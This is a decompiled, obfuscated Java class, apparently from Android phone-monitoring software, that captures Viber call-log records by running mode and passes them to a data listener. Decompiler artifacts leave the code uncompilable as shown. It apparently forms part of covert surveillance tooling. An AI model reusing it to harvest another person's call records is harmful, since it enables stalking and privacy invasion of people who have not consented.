package com.vvt.capture.viber.a.a;

import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.e;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class a
  extends com.vvt.base.capture.b
{
  private static final boolean a = com.vvt.ak.a.b;
  private com.vvt.base.a b;
  private String c;
  private e d;
  private f e;
  private RunningMode f;
  
  public a(Context paramContext, String paramString, com.vvt.base.a parama, RunningMode paramRunningMode, com.vvt.n.a.b paramb, com.vvt.base.b paramb1)
  {
    this.c = paramString;
    this.b = parama;
    this.f = paramRunningMode;
    Object localObject1 = this.f;
    Object localObject2 = RunningMode.FULL;
    boolean bool;
    if (localObject1 == localObject2)
    {
      bool = a;
      if (bool) {}
      localObject1 = new com/vvt/capture/viber/a/a/a/a/a;
      ((com.vvt.capture.viber.a.a.a.a.a)localObject1).<init>();
      this.d = ((e)localObject1);
      localObject1 = new com/vvt/capture/viber/a/a/a/a/b;
      ((com.vvt.capture.viber.a.a.a.a.b)localObject1).<init>();
      this.e = ((f)localObject1);
    }
    for (;;)
    {
      return;
      localObject1 = this.f;
      localObject2 = RunningMode.LIMITED_1;
      if (localObject1 == localObject2)
      {
        bool = a;
        if (bool) {}
        localObject1 = new com/vvt/capture/viber/a/a/a/b/a;
        ((com.vvt.capture.viber.a.a.a.b.a)localObject1).<init>(paramb);
        this.d = ((e)localObject1);
        localObject1 = new com/vvt/capture/viber/a/a/a/b/b;
        localObject2 = this.c;
        ((com.vvt.capture.viber.a.a.a.b.b)localObject1).<init>((String)localObject2, paramb1);
        this.e = ((f)localObject1);
      }
      else
      {
        bool = a;
        if (!bool) {}
      }
    }
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = a;
    if ((!bool1) || (paramList != null))
    {
      Iterator localIterator = paramList.iterator();
      for (;;)
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject = localIterator.next();
        boolean bool2 = localObject instanceof com.vvt.capture.viber.a;
        if (bool2)
        {
          localObject = b.a((com.vvt.capture.viber.a)localObject);
          localArrayList.add(localObject);
        }
      }
      Object localObject = this.b;
      if (localObject != null)
      {
        bool1 = k();
        if (bool1)
        {
          bool1 = a;
          if (bool1) {}
          localObject = this.b;
          ((com.vvt.base.a)localObject).a(localArrayList);
        }
      }
    }
  }
  
  protected e b()
  {
    return this.d;
  }
  
  protected f c()
  {
    return this.e;
  }
  
  protected String d()
  {
    return "ViberCallLogCapture";
  }
  
  protected String e()
  {
    return this.c;
  }
  
  protected String f()
  {
    return "viber_calllog.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/viber/a/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */